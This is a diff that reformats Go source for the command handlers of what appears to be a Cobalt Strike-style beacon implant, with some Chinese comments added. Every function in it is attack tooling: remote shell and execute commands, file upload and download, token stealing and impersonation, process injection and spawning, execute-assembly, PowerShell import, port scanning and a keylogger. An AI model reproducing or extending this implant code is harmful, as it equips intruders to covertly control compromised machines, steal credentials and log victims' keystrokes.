@@ -13,42 +13,43 @@ import (
 	"time"
 )
 
-func CmdShell (cmdBuf []byte, Token uintptr) ([]byte, error){
-	shellPath, shellBuf, err:= packet.ParseCommandShell(cmdBuf)
-	if err != nil{
+func CmdShell(cmdBuf []byte, Token uintptr) ([]byte, error) {
+	shellPath, shellBuf, err := packet.ParseCommandShell(cmdBuf)
+	if err != nil {
 		return nil, err
 	}
 	var result []byte
-	if shellPath == "" && runtime.GOOS == "windows"{
-		result, err = packet.Run(shellBuf, Token)
+	if shellPath == "" && runtime.GOOS == "windows" { // 编译时选择架构
+		result, err = packet.Run(shellBuf, Token) // 未支持
 		return result, err
-	}else{
+	} else {
 		result, err = packet.Shell(shellPath, shellBuf)
 		return result, err
 	}
 }
 
-func CmdUploadStart (cmdBuf []byte) ([]byte, error){
+func CmdUploadStart(cmdBuf []byte) ([]byte, error) {
 	filePath, fileData := packet.ParseCommandUpload(cmdBuf)
 	filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
-	result, err :=packet.Upload(filePathStr, fileData)
-	if err != nil{
+	result, err := packet.Upload(filePathStr, fileData)
+	if err != nil {
 		return nil, err
 	}
 	return result, nil
 }
 
-func CmdUploadLoop (cmdBuf []byte) ([]byte, error){
+func CmdUploadLoop(cmdBuf []byte) ([]byte, error) {
 	filePath, fileData := packet.ParseCommandUpload(cmdBuf)
 	filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
-	result, err :=packet.Upload(filePathStr, fileData)
-	if err != nil{
+	result, err := packet.Upload(filePathStr, fileData)
+	if err != nil {
 		return nil, err
 	}
 	return result, nil
 }
 
-func CmdDownload (cmdBuf []byte) ([]byte, error){
+// 分段发送，支持大文件发送
+func CmdDownload(cmdBuf []byte) ([]byte, error) {
 	filePath := cmdBuf
 	strFilePath := string(filePath)
 	strFilePath = strings.ReplaceAll(strFilePath, "\\", "/")
@@ -90,94 +91,94 @@ func CmdDownload (cmdBuf []byte) ([]byte, error){
 
 }
 
-func CmdFileBrowse (cmdBuf []byte) ([]byte, error){
+func CmdFileBrowse(cmdBuf []byte) ([]byte, error) {
 	return packet.File_Browse(cmdBuf)
 }
 
-func CmdCd (cmdBuf []byte) ([]byte, error){
+func CmdCd(cmdBuf []byte) ([]byte, error) {
 	return packet.ChangeCurrentDir(cmdBuf)
 }
 
-func CmdSleep (cmdBuf []byte) ([]byte, error){
+func CmdSleep(cmdBuf []byte) ([]byte, error) {
 	sleep := packet.ReadInt(cmdBuf[:4])
-	if sleep!='d'{
+	if sleep != 'd' {
 		config.WaitTime = time.Duration(sleep) * time.Millisecond
 		return []byte("Sleep time changes to " + strconv.Itoa(int(sleep)/1000) + " seconds"), nil
 	}
 	return nil, nil
 }
 
-func CmdPwd () ([]byte, error){
+func CmdPwd() ([]byte, error) {
 	return packet.GetCurrentDirectory()
 }
 
-func CmdSpawnX64(cmdBuf []byte) ([]byte, error){
+func CmdSpawnX64(cmdBuf []byte) ([]byte, error) {
 	cmdString := string(cmdBuf)
 	cmdString = strings.Replace(cmdString, "ExitProcess", "ExitThread"+"\x00", -1)
 	return packet.Spawn_X64([]byte(cmdString))
 }
 
-func CmdSpawnX86(cmdBuf []byte) ([]byte, error){
+func CmdSpawnX86(cmdBuf []byte) ([]byte, error) {
 	cmdString := string(cmdBuf)
 	cmdString = strings.Replace(cmdString, "ExitProcess", "ExitThread"+"\x00", -1)
 	return packet.Spawn_X86([]byte(cmdString))
 }
 
-func CmdExecute(cmdBuf []byte, Token uintptr) ([]byte, error){
+func CmdExecute(cmdBuf []byte, Token uintptr) ([]byte, error) {
 	return packet.Execute(cmdBuf, Token)
 }
 
-func CmdGetUid() ([]byte, error){
+func CmdGetUid() ([]byte, error) {
 	return packet.GetUid()
 }
 
-func CmdStealToken(cmdBuf []byte) (uintptr, []byte, error){
+func CmdStealToken(cmdBuf []byte) (uintptr, []byte, error) {
 	pid := packet.ReadInt(cmdBuf[:4])
 	return packet.Steal_token(pid)
 }
 
-func CmdPs() ([]byte, error){
+func CmdPs() ([]byte, error) {
 	return packet.ListProcess()
 }
 
-func CmdKill(cmdBuf []byte) ([]byte, error){
+func CmdKill(cmdBuf []byte) ([]byte, error) {
 	pid := packet.ReadInt(cmdBuf[:4])
 	return packet.KillProcess(pid)
 }
 
-func CmdMkdir(cmdBuf []byte) ([]byte, error){
+func CmdMkdir(cmdBuf []byte) ([]byte, error) {
 	return packet.Mkdir(cmdBuf)
 }
 
-func CmdDrives() ([]byte, error){
+func CmdDrives() ([]byte, error) {
 	return packet.Drives()
 }
 
-func CmdRm(cmdBuf []byte) ([]byte, error){
+func CmdRm(cmdBuf []byte) ([]byte, error) {
 	return packet.Remove(cmdBuf)
 }
 
-func CmdCp(cmdBuf []byte) ([]byte, error){
+func CmdCp(cmdBuf []byte) ([]byte, error) {
 	return packet.Copy(cmdBuf)
 }
 
-func CmdMv(cmdBuf []byte) ([]byte, error){
+func CmdMv(cmdBuf []byte) ([]byte, error) {
 	return packet.Move(cmdBuf)
 }
 
-func CmdRun2self(Token uintptr) (uintptr, []byte, error){
-	flag, err :=packet.Run2self()
-	if err != nil{
+func CmdRun2self(Token uintptr) (uintptr, []byte, error) {
+	flag, err := packet.Run2self()
+	if err != nil {
 		return Token, nil, err
 	}
-	if flag{
+	if flag {
 		return 0, nil, err
 	} else {
 		return Token, nil, err
 	}
 }
 
-func CmdMakeToken(cmdBuf []byte) (uintptr, []byte, error){
+func CmdMakeToken(cmdBuf []byte) (uintptr, []byte, error) {
 	Token, err := packet.Make_token(cmdBuf)
 	if err != nil {
 		return 0, nil, err
@@ -185,41 +186,38 @@ func CmdMakeToken(cmdBuf []byte) (uintptr, []byte, error){
 	return Token, []byte("Make token success"), nil
 }
 
-func CmdHandlerJob(cmdBuf []byte) ([]byte, error){
+func CmdHandlerJob(cmdBuf []byte) ([]byte, error) {
 	return packet.HandlerJob(cmdBuf)
 }
 
-func CmdPortscanX64(cmdBuf []byte) ([]byte, error){
+func CmdPortscanX64(cmdBuf []byte) ([]byte, error) {
 	cmdString := string(cmdBuf)
 	cmdString = strings.Replace(cmdString, "ExitProcess", "ExitThread"+"\x00", -1)
 	return packet.Spawn_X64([]byte(cmdString))
 }
 
-func CmdKeylogger(cmdBuf []byte) ([]byte, error){
+func CmdKeylogger(cmdBuf []byte) ([]byte, error) {
 	return packet.HandlerJob(cmdBuf)
 }
 
-func CmdExecuteAssemblyX64(cmdBuf []byte) ([]byte, error){
+func CmdExecuteAssemblyX64(cmdBuf []byte) ([]byte, error) {
 	length := packet.ReadInt(cmdBuf[29:33])
 	index := strings.Index(string(cmdBuf[length+33:]), string([]byte{byte(0), byte(0), byte(77), byte(90), byte(144), byte(0)}))
-	param := string(cmdBuf[length+33:length+33+uint32(index)])
+	param := string(cmdBuf[length+33 : length+33+uint32(index)])
 	param = strings.ReplaceAll(param, "\x00", "")
 	param = strings.Trim(param, " ")
 	params := strings.Split(param, " ")
 	return packet.ExecuteAssembly(cmdBuf[33:length+33], params)
 }
 
-func CmdImportPowershell(cmdBuf []byte) ([]byte, error){
+func CmdImportPowershell(cmdBuf []byte) ([]byte, error) {
 	return packet.PowershellImport(cmdBuf)
 }
 
-func CmdPowershellPort(cmdBuf []byte, powershellImport []byte) ([]byte, error){
+func CmdPowershellPort(cmdBuf []byte, powershellImport []byte) ([]byte, error) {
 	return packet.PowershellPort(cmdBuf, powershellImport)
 }
 
-func CmdInjectX64(cmdBuf []byte) ([]byte, error){
+func CmdInjectX64(cmdBuf []byte) ([]byte, error) {
 	return packet.InjectProcess(cmdBuf)
 }
-
-
-
